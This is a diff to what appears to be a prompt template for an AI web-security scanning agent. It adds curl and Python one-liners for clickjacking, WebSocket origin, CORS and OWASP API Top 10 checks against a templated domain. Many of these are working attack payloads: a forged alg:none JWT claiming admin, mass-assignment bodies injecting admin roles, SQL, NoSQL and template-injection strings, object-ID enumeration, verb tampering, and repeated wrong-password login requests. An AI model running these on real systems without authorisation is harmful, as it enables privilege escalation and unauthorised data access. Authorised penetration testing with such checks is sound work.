+  python3 -c "import subprocess; ua='{_BUA}'; hdrs=subprocess.run(['curl','-L','-4','-sI','--max-time','12','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=16).stdout.lower(); xfo='x-frame-options' in hdrs; fa='frame-ancestors' in hdrs; print('X-Frame-Options:','PRESENT' if xfo else 'MISSING — MEDIUM clickjacking risk'); print('CSP frame-ancestors:','PRESENT' if fa else 'MISSING'); print('CLICKJACKING VULNERABLE: YES — HIGH finding' if not xfo and not fa else 'Protected')"
+  # Confirm by checking specific header values
+  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "x-frame-options|content-security-policy|frame-ancestors"
+
+[CLNT-WS] WebSocket Security
+  # Discover WebSocket endpoints in page source
+  python3 -c "import subprocess,re; ua='{_BUA}'; html=subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=18).stdout; ws=re.findall('(?:new WebSocket|io[(]|socket[.]connect)[(][\"\\x27]?(wss?://[^\"\\x27)]+)',html); [print('[WS ENDPOINT]',u) for u in ws] or print('(no WebSocket endpoints found in page source)'); wsgen=re.findall('(?:new WebSocket|WebSocket[(])[(][\"\\x27]([^\"\\x27]+)[\"\\x27][)]',html); [print('[WS GENERIC]',u) for u in wsgen]"
+  # Test WebSocket upgrade without Origin restriction
+  python3 -c "
+import subprocess
+ua='{_BUA}'
+# Check if server accepts WebSocket upgrade from arbitrary origin
+r=subprocess.run(['curl','-L','-4','-si','--max-time','10','-A',ua,'-H','Upgrade: websocket','-H','Connection: Upgrade','-H','Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==','-H','Sec-WebSocket-Version: 13','-H','Origin: https://evil-cfai-test.com','https://{{domain}}/ws'],capture_output=True,text=True,timeout=14)
+if '101' in r.stdout[:50]:
+    print('WS NO ORIGIN CHECK: /ws accepts upgrade from evil origin — HIGH finding')
+    print(r.stdout[:200])
+else:
+    # Try common WS paths
+    for p in ['/socket.io/','/ws','/websocket','/cable','/ws/chat','/live']:
+        r2=subprocess.run(['curl','-L','-4','-si','--max-time','8','-A',ua,'-H','Upgrade: websocket','-H','Connection: Upgrade','-H','Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==','-H','Sec-WebSocket-Version: 13','-H','Origin: https://evil-cfai-test.com','https://{{domain}}'+p],capture_output=True,text=True,timeout=12)
+        if '101' in r2.stdout[:50]:
+            print('WS ORIGIN CHECK MISSING:',p,'— HIGH finding'); print(r2.stdout[:150]); break
+    else:
+        print('(no WebSocket upgrade accepted on common paths)')
+"
 
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
@@ -1007,6 +1187,58 @@ Call this tool before API reconnaissance (it discovers issues faster than manual
 
 [APIT-02] Broken Object Level Authorization (BOLA/IDOR)
   python3 -c "import subprocess; ua='{_BUA}'; paths=['/api/user/','/api/v1/user/','/api/order/','/api/v1/order/','/api/account/','/api/invoice/','/api/document/','/api/file/']; ids=['1','2','3','100','9999','0','admin']; run=lambda u: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','8','https://{{domain}}'+u],capture_output=True,text=True,timeout=12).stdout.strip(); [print(c,path+i) for path in paths for i in ids for c in [run(path+i)] if c and c not in ('404','405','410','000','')]"
+
+[APIT-03] Broken Authentication (API)
+  # Test API endpoints for authentication bypass
+  python3 -c "import subprocess; ua='{_BUA}'; eps=['/api/me','/api/v1/me','/api/users','/api/v1/users','/api/admin','/api/v1/admin','/api/profile','/api/settings']; run=lambda p: subprocess.run(['curl','-L','-4','-si','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}'+p],capture_output=True,text=True,timeout=12); [print('UNAUTH API:',p,r.stdout[:80]) for p in eps for r in [run(p)] if r.stdout and any(x in r.stdout[:60] for x in ['200 OK','HTTP/2 200','HTTP/1.1 200'])]"
+  # Test with invalid/forged JWT — alg:none bypass (dynamically builds the token)
+  python3 -c "import subprocess,base64,json; ua='{_BUA}'; hdr=base64.urlsafe_b64encode(json.dumps(dict(alg='none',typ='JWT')).encode()).rstrip(b'=').decode(); pay=base64.urlsafe_b64encode(json.dumps(dict(sub='1',role='admin')).encode()).rstrip(b'=').decode(); jwt_none=hdr+'.'+pay+'.'; eps=['/api/me','/api/v1/me','/api/admin','/api/users']; [print('JWT-NONE bypass:',ep,subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-H','Authorization: Bearer '+jwt_none,'-A',ua,'--max-time','8','https://{{domain}}'+ep],capture_output=True,text=True,timeout=12).stdout.strip()) for ep in eps]"
+
+[APIT-04] Unrestricted Resource Consumption (Rate Limiting)
+  # Test rate limiting on auth endpoints — 20 rapid requests
+  python3 -c "
+import subprocess,time
+ua='{_BUA}'
+eps=['/api/login','/api/v1/login','/api/auth','/api/token','/api/register','/api/password/reset']
+for ep in eps:
+    codes=[]
+    for i in range(20):
+        r=subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-X','POST','https://{{domain}}'+ep,'-H','Content-Type: application/json','-A',ua,'--max-time','5','-d','{{"username":"admin","password":"wrong"}}'],capture_output=True,text=True,timeout=8)
+        codes.append(r.stdout.strip())
+    rate_limited=any(c in codes for c in ['429','503'])
+    print('Rate limit on',ep+':','PRESENT ('+str(codes.count('429'))+' 429s)' if rate_limited else 'MISSING — HIGH finding ('+','.join(set(codes))+')')
+    if not rate_limited: break
+"
+
+[APIT-05] Broken Function Level Authorization (BFLA)
+  # Test HTTP verb tampering on endpoints (GET→POST/PUT/DELETE without auth)
+  python3 -c "import subprocess; ua='{_BUA}'; eps=['/api/users','/api/v1/users','/api/user/1','/api/admin/users','/api/settings','/api/v1/settings']; verbs=['GET','POST','PUT','DELETE','PATCH']; run=lambda ep,v: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-X',v,'-H','Content-Type: application/json','-A',ua,'--max-time','8','https://{{domain}}'+ep],capture_output=True,text=True,timeout=12).stdout.strip(); [print('BFLA:',v,ep,'->',c) for ep in eps for v in verbs for c in [run(ep,v)] if c in ('200','201','204')]"
+
+[APIT-06] Mass Assignment (API)
+  # Inject privileged fields in API update calls
+  python3 -c "import subprocess; ua='{_BUA}'; payloads=['{{"role":"admin","is_admin":true,"permissions":["*"]}}','{{"admin":true}}','{{"privilege":"superuser"}}']; eps=['/api/user/1','/api/v1/user/1','/api/users/me','/api/profile','/api/account']; verbs=['PUT','PATCH','POST']; [print(subprocess.run(['curl','-L','-4','-si','-X',v,'https://{{domain}}'+ep,'-H','Content-Type: application/json','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','-d',pl],capture_output=True,text=True,timeout=14).stdout[:150]) for ep in eps for pl in payloads[:2] for v in ['PUT','PATCH']]"
+
+[APIT-07] Security Misconfiguration (API)
+  # CORS misconfiguration — does API reflect arbitrary Origin?
+  python3 -c "import subprocess; ua='{_BUA}'; eps=['/api','/api/v1','/api/me','/api/users']; evil='https://evil-cfai-attacker.com'; [print('CORS MISS:',ep,r.stdout[:200]) for ep in eps for r in [subprocess.run(['curl','-L','-4','-si','--max-time','8','-A',ua,'-H','Origin: '+evil,'-H','Access-Control-Request-Method: GET','https://{{domain}}'+ep],capture_output=True,text=True,timeout=12)] if 'evil-cfai-attacker.com' in r.stdout.lower() and 'access-control-allow-origin' in r.stdout.lower()]"
+  # Check for API documentation exposed (swagger, redoc, openapi)
+  python3 -c "import subprocess; ua='{_BUA}'; docs=['/swagger.json','/openapi.json','/api-docs','/swagger-ui.html','/redoc','/api/swagger.json','/api/openapi.json','/v1/swagger.json','/v2/swagger.json','/api-docs/swagger.json']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('API DOCS EXPOSED:',p,'HTTP',c) for p in docs for c in [run(p)] if c in ('200','301','302')]"
+
+[APIT-08] Injection via API
+  # Test API parameters for injection vulnerabilities
+  python3 -c "import subprocess; ua='{_BUA}'; q=chr(34); sql_pay='{{'+'id'+':'+q+'1 OR 1=1'+q+'}}'; nosql_pay='{{'+'username'+':{{'+'$gt'+':'+q+q+'}},'+'password'+':{{'+'$gt'+':'+q+q+'}}}}'; ssti_pay='{{'+'name'+':'+q+'{{{{7*7}}}}'+q+'}}'; eps=['/api/search','/api/v1/search','/api/users','/api/v1/users','/api/login','/api/v1/login']; errs=['sql syntax','error in your sql','mongodb','ora-','$gt','49']; [print('API INJECTION candidate:',ep,pl[:30]) for ep in eps for pl in [sql_pay,nosql_pay,ssti_pay] for r in [subprocess.run(['curl','-L','-4','-si','-X','POST','https://{{domain}}'+ep,'-H','Content-Type: application/json','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','-d',pl],capture_output=True,text=True,timeout=14)] if any(e in r.stdout.lower() for e in errs)]"
+
+[APIT-09] Improper Asset Management
+  # Discover old/deprecated API versions
+  python3 -c "import subprocess; ua='{_BUA}'; old_versions=['/api/v1','/api/v2','/api/v3','/v1','/v2','/v3','/api/beta','/api/old','/api/legacy','/api/test','/api/dev','/api/internal','/api/private','/api/staging']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); found=[(p,c) for p in old_versions for c in [run(p)] if c and c not in ('404','405','410','000','')]; [print('API VERSION:',p,'HTTP',c) for p,c in found]; print('Total active API versions:',len(found),'(>1 = Improper Asset Management risk)')"
+  # Check deprecated endpoints still accepting requests
+  python3 -c "import subprocess; ua='{_BUA}'; deprecated=['/api/v1/auth/login','/api/v1/users/me','/v1/token','/v1/auth','/api/1/login']; run=lambda p: subprocess.run(['curl','-L','-4','-si','--max-time','8','-X','POST','-H','Content-Type: application/json','-A',ua,'--max-time','8','-d','{{"username":"test","password":"test"}}','https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout[:100]; [print('OLD API ACTIVE:',p,r[:60]) for p in deprecated for r in [run(p)] if r and any(x in r for x in ['200','201','400','401','422'])]"
+
+[APIT-10] Unsafe Consumption of APIs / Insufficient Logging
+  # Check if API returns verbose error messages that aid attackers
+  python3 -c "import subprocess; ua='{_BUA}'; eps=['/api/v1/user/999999','/api/user/0','/api/order/-1','/api/product/null']; [print('VERBOSE ERROR:',ep,r.stdout[:300]) for ep in eps for r in [subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+ep],capture_output=True,text=True,timeout=12)] if r.stdout and any(x in r.stdout.lower() for x in ['stack trace','exception','sql','query failed','line ','file ','at ','undefined method','traceback'])]"
+  # Test if errors expose internal paths, DB queries, or stack traces
+  python3 -c "import subprocess; ua='{_BUA}'; bad_inputs=['/api/v1/user/%27','/api/v1/user/<script>','/api/v1/search?q=%27 OR 1=1']; [print('ERROR DISCLOSURE:',ep,r.stdout[:200]) for ep in bad_inputs for r in [subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+ep],capture_output=True,text=True,timeout=12)] if any(x in r.stdout.lower() for x in ['traceback','exception','syntax error','undefined','null pointer','stacktrace','at line','db error'])]"
 
 [APIT-99] GraphQL Security
   gql_found=0; for ep in /graphql /api/graphql /gql /graph /graphql/v1; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__typename}}"}}' --max-time 8 2>/dev/null); if [ "$code" != "404" ] && [ "$code" != "000" ] && [ "$code" != "" ]; then echo "GraphQL: $code https://{{domain}}$ep"; gql_found=1; curl -L -4 -s -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__schema{{types{{name}}}}}}"}}' --max-time 10 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || true; fi; done; [ $gql_found -eq 0 ] && echo "GRAPHQL: no GraphQL endpoints detected on {{domain}}" || true
